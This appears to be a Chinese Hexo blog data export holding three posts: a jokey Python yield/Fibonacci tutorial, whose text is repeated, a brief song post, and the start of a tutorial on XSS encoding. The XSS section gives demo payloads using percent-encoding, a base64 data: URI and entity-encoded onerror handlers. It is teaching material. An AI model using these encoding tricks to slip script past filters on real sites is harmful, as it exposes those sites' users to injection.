而第二种是每次循环用到的时候给你一个，再用到再给你一个，可以理解为他有一个算式，每次你找他要钱他都要当场算算，然后给你一天的生活费。那用第二种方法吧。（看起来很扣的样子）</p>\n<p>好，实现一个。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Fab</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, max)</span>:</span></div><div class=\"line\">        self.max = max</div><div class=\"line\">        self.n, self.a, self.b = <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span></div><div class=\"line\">        </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__iter__</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">return</span> self</div><div class=\"line\">        </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">next</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">if</span> self.n &lt; self.max:</div><div class=\"line\">            r = self.b</div><div class=\"line\">            self.a, self.b = self.b, self.a + self.b</div><div class=\"line\">            self.n = self.n + <span class=\"number\">1</span></div><div class=\"line\">            <span class=\"keyword\">return</span> r</div><div class=\"line\">        <span class=\"keyword\">raise</span> StopIteration()</div></pre></td></tr></table></figure></p>\n<p>基础差的看不懂的，其实上面的代码就是定义了一个算法，你每次问我要一个数，我就当场算一个数，不会像上一个版本直接返回给你一个List。<br>我们来调用一下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> Fab(<span class=\"number\">5</span>):</div><div class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">print</span> n</div><div class=\"line\">...</div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">5</span></div></pre></td></tr></table></figure></p>\n<p>嗯，成功了，这个版本性能是有了，可是隔壁王叔叔的侄女看了看代码不愿意了，帅哥（为什么要说出来？）你这个程序看着太复杂了啊，本来那么简单的代码怎么写的这么复杂啊？你这个人好复杂啊。</p>\n<p>很好小姑娘，你要是王叔叔，我特么把你家网线煮了。看在你说的挺有道理的份上（其实是长得好看），我看看能不能简单点。</p>\n<p>来，我们用一种高逼格的东西，兼顾简洁与性能，嘤嘤嘤。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fab</span><span class=\"params\">(max)</span>:</span></div><div class=\"line\">    n, a, b = <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span></div><div class=\"line\">    <span class=\"keyword\">while</span> n &lt; max:</div><div class=\"line\">        <span class=\"keyword\">yield</span> b</div><div class=\"line\">        <span class=\"comment\"># print b</span></div><div class=\"line\">        a, b = b, a + b</div><div class=\"line\">        n = n + <span class=\"number\">1</span></div></pre></td></tr></table></figure></p>\n<p>跟最初的第一个版本很像，注释掉了<code>print b</code>这句话，加上了 <code>yield b</code>。这里我们先调用下，看看结果。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> fab(<span class=\"number\">5</span>):</div><div class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">print</span> n</div><div class=\"line\">...</div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">5</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"吹牛B模式已开启\"><a href=\"#吹牛B模式已开启\" class=\"headerlink\" title=\"吹牛B模式已开启\"></a>吹牛B模式已开启</h3><p>ok, 现在来回想下我们一路走过来，从最初的版本到使用<code>yield</code>之前，经历了哪些改动？<br>仔细对照第一次的例子和这个使用<code>yield</code>的例子，好像差不多？再看看我们测试结果的代码有什么不同。<br>就是这里了<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 第一个例子</span></div><div class=\"line\">fab(<span class=\"number\">5</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># yield例子</span></div><div class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> fab(<span class=\"number\">5</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> n</div></pre></td></tr></table></figure></p>\n<p>发现问题了吗？</p>\n<blockquote>\n<ul>\n<li>fab(max) 函数中同样使用循环</li>\n<li>一个使用 yield，另一个使用 print 打印</li>\n<li>yield 例子，需要自己循环调用才能一个一个打印出来</li>\n</ul>\n</blockquote>\n<p>这里我们推测<code>yield</code>使用上的特点：</p>\n<blockquote>\n<ul>\n<li>暂停函数运行（要循环调用才管用）</li>\n<li>再次调用能从上次暂停的地方继续执行函数（数列是连续的）</li>\n<li>函数的每次运行都是遇到 yield 就停止并返回迭代值，下次再用时继续</li>\n<li>对不起我编不下去了</li>\n</ul>\n</blockquote>\n<p>据说还有更强大的使用方式，下次有机会研究研究写个续吧：）</p>\n<hr>\n<p><strong>隔壁王叔叔的儿子的小姨子表示小伙子，你再努努力，我就跟你跑了。</strong></p>\n<p>例子取自：<a href=\"http://www.liaoxuefeng.com/article/001373892916170b88313a39f294309970ad53fc6851243000\" target=\"_blank\" rel=\"external\">廖雪峰-Python yield使用浅析</a></p>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p><strong>题外话</strong></p>\n<ul>\n<li>最初接触 Python 这门语言的时候，看的是《Python 核心编程》 迷迷糊糊的把 <code>yield</code> 这里看过去了，知道这个东西是用来造一个<code>生成器</code>用的，就一带而过了，日后的搬砖过程中也不知道怎么用这个家伙事儿。</li>\n<li>我比较笨，学东西讨厌文档型说明（看不懂QAQ）。所以总是自己花很长时间去加工适合我的食物。</li>\n<li><iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=33211676&auto=0&height=66\"></iframe>\n\n</li>\n</ul>\n</blockquote>\n<hr>\n<h3 id=\"说起-yield，那这到底是个什么玩意？\"><a href=\"#说起-yield，那这到底是个什么玩意？\" class=\"headerlink\" title=\"说起 yield，那这到底是个什么玩意？\"></a>说起 <code>yield</code>，那这到底是个什么玩意？</h3><p>准备好了，我要开始背课文了：<br>……<br>","more":"<br>从小脑袋不好使，记不住……<br>还是编故事吧：</p>\n<p>有个叫斐波那契的老头（也可能是女的，跟我有什么关系），提出了一个（不明白他搞出这东西要干啥的）数列定义（斐波那契数列）：</p>\n<blockquote>\n<p>有一串数字，前两个是1，从第三个开始，每个数字都是它前两位数字的和。（1, 1, 2, 3, 5, 8, 13……）</p>\n</blockquote>\n<p>提出定义的人我可以理解为他无聊，但是后来一群抠脚大汉开始对第N个数是多少那么感兴趣是什么鬼？这玩意算出来能干啥？（不知道）</p>\n<p>不行，我也要凑热闹。（koujiao……）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fab</span><span class=\"params\">(max)</span>:</span></div><div class=\"line\">    n, a, b = <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span></div><div class=\"line\">    <span class=\"keyword\">while</span> n &lt; max:</div><div class=\"line\">        <span class=\"keyword\">print</span> b</div><div class=\"line\">        a, b = b, a + b</div><div class=\"line\">        n = n + <span class=\"number\">1</span></div></pre></td></tr></table></figure>\n<p>好，跑一下试试。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>fab(<span class=\"number\">5</span>)</div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">5</span></div></pre></td></tr></table></figure></p>\n<p>结果是对的，你以为这就完了？<br>隔壁王叔叔表示小伙子你这个写的有点问题啊，你这个直接<code>print</code>出来的，只能给我看，不能让我直接拿来用啊（你用它能干嘛？[手动黑人问号]）<br>好，那就听您老的，给你返回一个 List 让你用（？？？）。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fab</span><span class=\"params\">(max)</span>:</span></div><div class=\"line\">    n, a, b = <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span></div><div class=\"line\">    list = []</div><div class=\"line\">    <span class=\"keyword\">while</span> n &lt; max:</div><div class=\"line\">        list.append(b)</div><div class=\"line\">        a, b = b, a + b</div><div class=\"line\">        n = n + <span class=\"number\">1</span></div><div class=\"line\">    <span class=\"keyword\">return</span> list</div></pre></td></tr></table></figure></p>\n<p>来，试一下。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> fab(<span class=\"number\">5</span>):</div><div class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">print</span> n</div><div class=\"line\">...</div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">5</span></div></pre></td></tr></table></figure></p>\n<p>隔壁王叔叔的丈母娘（跟直系亲属姥姥不是一个人，谢谢)表示，小伙子你这个程序太特么占内存了，我输入大一点，这个List占用的内存都够我玩刺客信条大革命了（excuse me??)。</p>\n<h3 id=\"性能优化\"><a href=\"#性能优化\" class=\"headerlink\" title=\"性能优化\"></a>性能优化</h3><p>如果对python有一些了解的话，我们能很自然的想到一个经常拿来装逼的东西<code>xrange</code>。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 1</span></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1000</span>): </div><div class=\"line\">    <span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 2</span></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">1000</span>):</div><div class=\"line\">    <span class=\"keyword\">pass</span></div></pre></td></tr></table></figure></p>\n<p>上面的两种写法，第一种是直接生成 1000个元素的List，相当于一次性给你一年的生活费。 而第二种是每次循环用到的时候给你一个，再用到再给你一个，可以理解为他有一个算式，每次你找他要钱他都要当场算算，然后给你一天的生活费。那用第二种方法吧。（看起来很扣的样子）</p>\n<p>好，实现一个。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Fab</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, max)</span>:</span></div><div class=\"line\">        self.max = max</div><div class=\"line\">        self.n, self.a, self.b = <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span></div><div class=\"line\">        </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__iter__</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">return</span> self</div><div class=\"line\">        </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">next</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">if</span> self.n &lt; self.max:</div><div class=\"line\">            r = self.b</div><div class=\"line\">            self.a, self.b = self.b, self.a + self.b</div><div class=\"line\">            self.n = self.n + <span class=\"number\">1</span></div><div class=\"line\">            <span class=\"keyword\">return</span> r</div><div class=\"line\">        <span class=\"keyword\">raise</span> StopIteration()</div></pre></td></tr></table></figure></p>\n<p>基础差的看不懂的，其实上面的代码就是定义了一个算法，你每次问我要一个数，我就当场算一个数，不会像上一个版本直接返回给你一个List。<br>我们来调用一下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> Fab(<span class=\"number\">5</span>):</div><div class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">print</span> n</div><div class=\"line\">...</div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">5</span></div></pre></td></tr></table></figure></p>\n<p>嗯，成功了，这个版本性能是有了，可是隔壁王叔叔的侄女看了看代码不愿意了，帅哥（为什么要说出来？）你这个程序看着太复杂了啊，本来那么简单的代码怎么写的这么复杂啊？你这个人好复杂啊。</p>\n<p>很好小姑娘，你要是王叔叔，我特么把你家网线煮了。看在你说的挺有道理的份上（其实是长得好看），我看看能不能简单点。</p>\n<p>来，我们用一种高逼格的东西，兼顾简洁与性能，嘤嘤嘤。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fab</span><span class=\"params\">(max)</span>:</span></div><div class=\"line\">    n, a, b = <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span></div><div class=\"line\">    <span class=\"keyword\">while</span> n &lt; max:</div><div class=\"line\">        <span class=\"keyword\">yield</span> b</div><div class=\"line\">        <span class=\"comment\"># print b</span></div><div class=\"line\">        a, b = b, a + b</div><div class=\"line\">        n = n + <span class=\"number\">1</span></div></pre></td></tr></table></figure></p>\n<p>跟最初的第一个版本很像，注释掉了<code>print b</code>这句话，加上了 <code>yield b</code>。这里我们先调用下，看看结果。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> fab(<span class=\"number\">5</span>):</div><div class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">print</span> n</div><div class=\"line\">...</div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"number\">5</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"吹牛B模式已开启\"><a href=\"#吹牛B模式已开启\" class=\"headerlink\" title=\"吹牛B模式已开启\"></a>吹牛B模式已开启</h3><p>ok, 现在来回想下我们一路走过来，从最初的版本到使用<code>yield</code>之前，经历了哪些改动？<br>仔细对照第一次的例子和这个使用<code>yield</code>的例子，好像差不多？再看看我们测试结果的代码有什么不同。<br>就是这里了<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 第一个例子</span></div><div class=\"line\">fab(<span class=\"number\">5</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># yield例子</span></div><div class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> fab(<span class=\"number\">5</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> n</div></pre></td></tr></table></figure></p>\n<p>发现问题了吗？</p>\n<blockquote>\n<ul>\n<li>fab(max) 函数中同样使用循环</li>\n<li>一个使用 yield，另一个使用 print 打印</li>\n<li>yield 例子，需要自己循环调用才能一个一个打印出来</li>\n</ul>\n</blockquote>\n<p>这里我们推测<code>yield</code>使用上的特点：</p>\n<blockquote>\n<ul>\n<li>暂停函数运行（要循环调用才管用）</li>\n<li>再次调用能从上次暂停的地方继续执行函数（数列是连续的）</li>\n<li>函数的每次运行都是遇到 yield 就停止并返回迭代值，下次再用时继续</li>\n<li>对不起我编不下去了</li>\n</ul>\n</blockquote>\n<p>据说还有更强大的使用方式，下次有机会研究研究写个续吧：）</p>\n<hr>\n<p><strong>隔壁王叔叔的儿子的小姨子表示小伙子，你再努努力，我就跟你跑了。</strong></p>\n<p>例子取自：<a href=\"http://www.liaoxuefeng.com/article/001373892916170b88313a39f294309970ad53fc6851243000\" target=\"_blank\" rel=\"external\">廖雪峰-Python yield使用浅析</a></p>"},{"title":"分享一首歌","date":"2016-12-01T01:24:10.000Z","layout":"post","comments":1,"_content":"\n“是我先喜欢的你，所以你可以在我面前尽情的嚣张了。”\n“为什么要嚣张？”\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"http://music.163.com/outchain/player?type=2&id=26260078&auto=0&height=66\"></iframe>\n<!--more-->\n\n\n你也许不会再出现在我的文字里了。\n其实你也有很久都没出现在我的文字里了：）","source":"_posts/zyt.md","raw":"---\ntitle: 分享一首歌\ndate: 2016-12-01 09:24:10\nlayout: post\ncomments: true\n# reward: true\ntags:\n    - 音乐\n---\n\n“是我先喜欢的你，所以你可以在我面前尽情的嚣张了。”\n“为什么要嚣张？”\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"http://music.163.com/outchain/player?type=2&id=26260078&auto=0&height=66\"></iframe>\n<!--more-->\n\n\n你也许不会再出现在我的文字里了。\n其实你也有很久都没出现在我的文字里了：）","slug":"zyt","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k8g000pmkwb9l0vuv6m","content":"<p>“是我先喜欢的你，所以你可以在我面前尽情的嚣张了。”<br>“为什么要嚣张？”</p>\n<p><iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"http://music.163.com/outchain/player?type=2&id=26260078&auto=0&height=66\"></iframe><br><a id=\"more\"></a></p>\n<p>你也许不会再出现在我的文字里了。<br>其实你也有很久都没出现在我的文字里了：）</p>\n","site":{"data":{}},"excerpt":"<p>“是我先喜欢的你，所以你可以在我面前尽情的嚣张了。”<br>“为什么要嚣张？”</p>\n<p><iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"http://music.163.com/outchain/player?type=2&id=26260078&auto=0&height=66\"></iframe><br>","more":"</p>\n<p>你也许不会再出现在我的文字里了。<br>其实你也有很久都没出现在我的文字里了：）</p>"},{"title":"XSS 编码的一些基础知识","date":"2017-09-07T17:01:01.000Z","layout":"post","comments":1,"reward":true,"_content":"\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=786262&auto=0&height=66\"></iframe>\n\n>记得那天，Windows xp 桌面上的天很蓝。  \n这是第几次远远的望着已经记不清了，走上前试试看吧。  \n我表现的不是很熟络，交谈的过程却出奇的愉快，好感度的 Level 似乎在不经意间也升了几级。  \n伴随着逐渐深入的交流，难免会擦出些共鸣的火花。  \n我是个对待这种事情比较认真的人。 \n<!--more -->了解的时候，走走心就好了。  \n真到了认定了的时候，再走……走四方，路迢……<br>\n可能那一天来的快了些，仓促间暴露出了还没准备好的胆怯。  \n不知道有没有被看到，不过想想也却是没什么丢人的。  \n说来也不怕笑话，平时会刻意让自己多留意一些有关体位的姿势。  \n在得到“请开始你的表演”的暗示时，脑海中的各种体位交错在一起，心还不争气的砰砰跳个不停。    \n这短暂的瞬间突然很慌张，毕竟没有实际操作的经验，这些体位有没有效果我心里也没底。<br>\n我动起来的那一刻，我完全不知道下一秒会得到什么样的反应。  \n毕竟是个没有经验的年轻人，当发现没有回应的时候，内心那个轻声呢喃的质疑声现在都还记得。  \n有点慌张，还有些不知所措。  \n不知从哪里涌出来的不甘让我顾不及反应如何就把脑中的体位一个接一个的用了出来。  \n渐渐的有了回应，因某些姿势恰到好处弹出回应的 body 给了我一些信心。  \n可有时任凭我姿势如何，那依然沉寂的如没有音乐的骨灰盒的 body，却成了挥不去的阴影。<br>\n那天事后，我点了支烟。  \n脑海中回忆着前一刻自己操作的慌张，眼神透过迷蒙的烟雾望着前方。  \n我想通了一件事情。  \nXSS 这样各种编码瞎特么插，迟早药丸。\n\n---\n\n前几天有人看了我前面的博客后问我「什么样的情况下使用什么编码方式?」  \n当时我就扇了自己一嘴巴子，确实心路历程描述的不够饱满……\n\n### 正文之前\n编码这件事如果瞎j8操作那真是犹如「加藤老师扣人嘴」，还是写一写吧。便有了这篇。\n\n其实该使用什么编码插入，要根据实际情况而定，单一的编码，混合编码都有可能。重要的是清楚**哪种编码**在**哪个时刻**被**哪种规则**解析。 \n\n简单点来说就是：URL 请求时会对百分号等 URL 的编码方式进行转码；浏览器接收到页面数据后，会对 HTML 实体编码进行转码；执行 JS 时会对 JSUnicode 等 JS 支持的方式进行转码。\n\n复合编码的情况稍微复杂了些，比如这样：  \n```html\n<html>\n<body>\n    <a href=\"javascript:ShowSomething('&#37&#53&#99&#37&#55&#56&#37&#51&#52&#37&#51&#49');\">click</a>\n</body>\n<script>\n    function ShowSomething(x){\n        alert(x);\n    }\n</script>\n</html>\n```\n这个例子中，从浏览器开始加载页面到你点击「click」弹出内容，`ShowSomething()` 的参数经过了三次转码。\n\n如果看不懂上面的例子没关系，等看完这篇文章，你还是看不懂上面的例子，再跳楼也不迟：）\n\n好进入正题前先说明（anli）一下：\n下文中不会刻意说明某些字符转码前后分别是什么，大家请自行对照。  \n如果有转码需求，可以使用 Cos 他们这个开源工具 「[xssor.io](http://xssor.io/)」 自行转码。  \n\n另外，本篇会面向基础薄弱的读者。会写的相对浅显，例如不会提及 `DOM` 、 `JS 解释器` 等这类需要一定知识积累的概念。老司机可以下车了～\n\n### URL 编码\n这里要说的 URL 编码指的是 **URI 的百分号编码**。\n我们在进行 URL 请求时，浏览器会自动帮我们把部分符号转换成 `'%' + '十六进制数字'` 的形式，用 windows 时间长的朋友们可能会遇见自己的安装软件时显示的路径中有一些`字符`或者`中文`会被显示为这种形式。   \n\n服务器接收到提交来的请求时，会先把 `%` 编码转换成正常的字符。\n我们借助一个简单的 php web 应用来说明这个问题，代码很简单：\n```html\n<html>\n<body>\n    < a href=' \"URL 请 求：\" + location.search.substr(1) +\n                \"\\n\" + \n                \"服务器接受：\" + \"<?php echo 'para='.$_GET['para']?>\"\n            );'\n    >click</ a>\n</body>\n</html>\n```\n上面这段代码可以自己放到自己的服务器上试一下。  \n当我们带着这样的参数请求时：\n```\nhttp://www.xxx.com/xxx.php?para=%3Cscript%3E%61lert();%3C/script%3E\n```\n![url_encode](/Image/url_encode.png)\n\n从 `alert()` 的内容和 Chrome 的控制台都能看出我们的「百分号编码」被转义为正常内容了。  \n其中 `alert()` 中的 `a` 被我转成了 `%61`，想说明除了符号，数字和字母也是可以做转换的。\n\nURL 这里其实还有一种 **Base64** 编码, 常用来做简单加密传输数据。  \n比如我们在 「[xssor.io](http://xssor.io/)」 中使用 「Base64EN」转换下面的代码  \n`<script>alert(/xss/);</script>` 得到： `PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+`  \n我们可以这样试试效果：\n```html\n<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+\">XSS</a>\n```\n点击链接后，就会通过 data 协议去加载后面的内容。其中，如果声明了 Base64 的话，就会做相应的 Base64 解码操作。对了，这个例子在 Chrome 里会被拦截，点击没反应的话，按 F12 你会看到红色的警告，控制台里点击一下链接就看到效果了。  \n其实还有……这里就不讲了。想拓展的可以去 「[xssor.io](http://xssor.io/)」看看上面都有什么，这也是一种学习方式：）。\n### HTML 实体编码\n有些时候，我们想在页面上显示的东西会跟 HTML 本身的标记冲突。  \n比如我们只想在页面中显示 `<script>alert();</script>` 而不是执行这串代码的时候，我们如下这样写是不行的：\n```html\n<html>\n<body>\n    <script>alert();</script>\n</body>\n</html>\n```\n其中的 `<script>alert();</script>` 会被当作 JS 脚本进行解析。  \n但如果我们把这些字符用另一种方式表示，只要不出现类似 `<script>` 这种内容的话，问题似乎就解决了。  \nHTML 编码就是用来解决这件事情的，我们的 ‘<’ 字符可以用 HTML编码中的 `&lt;` 来表示。  \n那我们的代码可以变成：\n```html\n<html>\n<body>\n    &lt;scirpt>alert();&lt;/script>\n</body>\n</html>\n```\n上面的代码可以自己拷贝出来，保存到文本文件，起名 xxx.html 然后用浏览器打开试试看。  \n上面用到的是 `'&' + '约定名称' + ';'` 的形式，其实还有 `'&#' + '十进制数字' + ';'` 和 `'&#x' + '十六进制数字' + ';'` 的形式。比如上文的 `'<'` 这个字符可以表示为 `&#0060;` 和 `&#x003c;`。  \n其中约定名称是为了便于记忆，后面的十进制和十六进制编码中 `#` 后面的连续的零多几个或者少几个都可以，类似`1`和`00001`的数值是相等的感觉。  \n  \n我们都知道这样是可以触发弹窗的（不知道的话，要自行补一补哦）：\n```html\n<html>\n<body>\n    <img src='' onerror='alert();'/>\n</body>\n</html>\n```\n我们还可以应用 HTML 实体编码这样：\n```html\n<html>\n<body>\n    <img src='' onerror='&#97;lert&#40;&#41;&#59'/>\n</body>\n</html>\n```\n但有个要求：HTML 实体编码不能干扰到标签自身的属性和声明性内容。\n比如：\n```html\n<html>\n<body>\n    <im&#103; src='' onerror='alert();'/>\n    <img sr&#99;='' onerror='alert();'/>\n</body>\n</html>\n```\n都是不行的。\n\n关于 HTML 实体编码，十进制与十六进制编码后面的 ';' 是可以省略的。\n\n### JS 编码\n到这里，可能大家面对各种编码已经比较淡定了，不就是不同的编码规则嘛。\n首先说说 JS Unicode 编码\n规则是 `'\\u' + '四位十六进制数字'` 不够四位前面补0。  